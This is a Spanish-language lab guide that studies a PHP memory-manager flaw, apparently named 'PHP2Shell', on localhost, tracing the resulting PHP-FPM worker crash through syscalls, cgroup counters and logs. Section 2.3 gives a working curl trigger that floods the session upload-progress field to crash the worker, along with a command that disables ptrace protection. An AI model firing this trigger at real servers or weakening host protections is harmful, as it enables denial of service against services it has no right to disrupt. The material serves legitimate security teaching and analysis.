# Análisis de Sistemas Operativos: PHP2Shell (CVE-2026-109618 / CVE-2026-109619)

> **Propósito:** análisis académico y ofensivo-defensivo **controlado** en
> `127.0.0.1`. El objetivo es correlacionar el fallo de memoria en espacio de
> usuario (Zend MM) con mecánicas del SO: llamadas al sistema, memoria virtual,
> señales, ciclo de vida de PHP-FPM, montajes y logs.
>
> Este documento complementa la guía práctica
> [`lab/os-activity/README.md`](lab/os-activity/README.md). La actividad se
> resuelve con **comandos de Linux**, sin scripts auxiliares ni plantilla de
> informe.

## 1. Fundamentos

### 1.1 Espacio de usuario y espacio de kernel

- **Zend Memory Manager (Zend MM):** PHP no pide todo con `malloc`; solicita
  bloques grandes al SO con `mmap(2)` (normalmente ~2 MiB) y reparte
  asignaciones pequeñas desde *bins*.
- **`memory_limit`:** contador del Zend MM. Es independiente del RSS, de
  `VmSize`/`VmRSS`, de `ulimit -v` y del límite del cgroup.
- **OOM de PHP:** al superar `memory_limit`, Zend MM llama a
  `zend_mm_safe_error()` → `zend_bailout()` → `longjmp()`. Ese salto abandona
  la pila de llamadas sin ejecutar el *cleanup* normal en todos los puntos.
- **OOM del kernel:** el SO no puede asignar páginas físicas y activa el OOM
  killer. Se comprueba con `dmesg`, `journalctl -k` y
  `memory.events` del cgroup v2.

### 1.2 Memoria virtual

- `mmap(MAP_ANONYMOUS|MAP_PRIVATE)` es el mecanismo típico de Zend MM.
- `brk`/`sbrk` es menos común en este flujo.
- ASLR importa para convertir corrupción en ejecución, pero queda fuera de
  este PoC.
- `mmap` crea un área virtual; las páginas físicas se asignan on-demand.
  `memory.current` y `memory.peak` reflejan el consumo del cgroup.

### 1.3 Procesos, señales y FastCGI

- **PHP-FPM:** un maestro administra un pool con hijos `www-data`. Si un hijo
  muere por un fatal (código 70) o por una señal, el maestro lo reemplaza.
- **FastCGI:** protocolo binario sobre socket. Un corte brusco de FPM puede
  producir `unexpected FastCGI record` en nginx y una respuesta `502`.
- **Señales:** `SIGSEGV` (11) es acceso inválido a memoria; `SIGKILL` (9) es
  terminación forzada, típica del OOM killer.

### 1.4 Syscalls a observar

| Syscall | Contexto | Qué permite ver |
|---|---|---|
| `mmap`, `munmap`, `mprotect` | Zend MM / allocators | Crecimiento y liberación de mappings |
| `open`, `read`, `write`, `close` | Sesión y archivos temporales | Escritura de `/tmp/sess_*` |
| `accept`, `recvfrom`, `sendto` | FastCGI/HTTP | Tráfico hacia el worker |
| `brk` | Allocator | Evolución del heap clásico |
| `clone`/`fork` | Maestro e hijos FPM | Ciclo de vida del pool |
| `exit_group`, `_exit` | Salida del worker | Código 70 o terminación por señal |

## 2. Dónde mirar en el laboratorio

### 2.1 cgroup v2

El contenedor PHP tiene `mem_limit: 256m`, pero PHP tiene `memory_limit=4M`.
Para leer el cgroup real:

```bash
CID=$(docker inspect -f '{{.Id}}' php2shell-lab-php-1)
CG=$(find /sys/fs/cgroup -type d -name "docker-$CID.scope" | head -n 1)
echo "$CG"
cat "$CG/memory.current"
cat "$CG/memory.peak"
cat "$CG/memory.max"
cat "$CG/memory.events"
```

En el caso normal del laboratorio, `memory.events` debe mostrar `oom 0` y
`oom_kill 0`: el kernel no mató el proceso; fue PHP quien abortó la petición.

### 2.2 Worker de PHP-FPM

```bash
docker top php2shell-lab-php-1 -eo pid,ppid,user,args
WORKER=$(docker top php2shell-lab-php-1 -eo pid,ppid,user,args \
  | awk '/php-fpm: pool / {print $1; exit}')
printf 'WORKER=%s\n' "$WORKER"
grep -E 'VmPeak|VmRSS|RssAnon|Threads' "/proc/$WORKER/status"
```

El pool tiene `pm.max_children = 1`, así que el worker que atiende la petición
es fácil de identificar y su reemplazo es determinista.

### 2.3 Traza de syscalls

Si `strace` no está instalado:

```bash
command -v strace || sudo apt install -y strace
```

Adjunta `strace` al worker desde el host:

```bash
sudo strace -f -tt -T -yy -s 256 \
  -e trace=mmap,munmap,brk,mprotect,read,write,openat,close,exit_group \
  -p "$WORKER" -o /tmp/php2shell-oom.strace
```

Si aparece `Operation not permitted`:

```bash
sudo sysctl -w kernel.yama.ptrace_scope=0
```

En otra terminal, dispara el OOM con `curl`:

```bash
SID=$(openssl rand -hex 16)
head -c 1048576 /dev/zero | tr '\0' 'A' > /tmp/phpsess-progress.txt
printf 'x' > /tmp/upload-small.txt
curl -sS -o /tmp/oom.html -w 'HTTP %{http_code}\n' \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=k" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=</tmp/phpsess-progress.txt" \
  -F "u0=@/tmp/upload-small.txt;filename=f0.txt;type=text/plain" \
  http://127.0.0.1:18080/
```

Revisa la traza:

```bash
grep -nE 'mmap|exit_group' /tmp/php2shell-oom.strace | tail -n 30
```

Busca el `mmap` de la asignación y el `exit_group(70)` del worker. El mensaje
`Allowed memory size ... exhausted` está en los logs de PHP, no en la traza.

## 3. Evidencia esperada

```bash
docker compose logs --since=5m php
docker compose logs --since=5m nginx
docker top php2shell-lab-php-1 -eo pid,ppid,user,args
```

Debe aparecer:

- `PHP Fatal error: Allowed memory size of 4194304 bytes exhausted ... in Unknown on line 0`.
- `WARNING: [pool www] child ... exited with code 70`.
- `NOTICE: [pool www] child ... started`.
- En nginx: `502` y `unexpected FastCGI record`.
- Un worker con PID nuevo.
- `memory.events` con `oom 0` y `oom_kill 0`.
- `/tmp/sess_<sid>` con modo `600`, dueño `www-data:www-data`.

La sesión se crea antes del OOM con una subida pequeña. Si no existe, el
disparo puede morir antes de escribirla; por eso la actividad separa la
validación de sesión del disparo de 1 MiB.

## 4. Diferencia entre OOM de PHP y OOM del kernel

| | OOM de PHP (`memory_limit`) | OOM del kernel/cgroup |
|---|---|---|
| Quién lo dispara | Zend MM al superar `memory_limit` | El SO al no poder asignar páginas |
| Log típico | `PHP Fatal error: Allowed memory size ... exhausted` | `Out of memory: Killed process ... (php-fpm)` |
| Señal | Fatal y salida de FPM con código 70 | `SIGKILL` (9) |
| `dmesg` | No aparece nada | Aparece `oom-kill` |
| Cuándo ocurre | `memory_limit` finito y bajo | `memory_limit=-1` y RAM del host/cgroup agotada |

En este laboratorio se observa el primer caso. El cgroup sigue por debajo de
256 MiB y `memory.events` permanece en cero.

## 5. Límites del laboratorio

- No se implementa heap grooming, estructuras falsas, direcciones de memoria
  ni llamadas a `system()`.
- El acto 1 demuestra **DoS controlado + escritura de sesión**, no RCE por
  corrupción de memoria.
- En FPM el fallo termina el worker y el maestro lo reemplaza; el RCE completo
  de CVE-2026-109618 se documenta en `mod_php`, que tiene otro ciclo de vida.
- El RCE del acto 2 se ejecuta contra `target/`, una aplicación PHP vulnerable
  por diseño. No explota CVE-2026-109618/619.

## 6. Referencias internas

- Guía práctica: [`lab/os-activity/README.md`](lab/os-activity/README.md)
- Laboratorio red team: [`lab/README.md`](lab/README.md)
- Reproductor HTTP: [`trigger.py`](trigger.py)
- Configuración: [`php/php.ini`](php/php.ini), [`php/www.conf`](php/www.conf)
- Scripts opcionales de trazado, fuera de la actividad:
  [`os-trace/trace-once.sh`](os-trace/trace-once.sh) y
  [`os-trace/trace-worker.sh`](os-trace/trace-worker.sh)
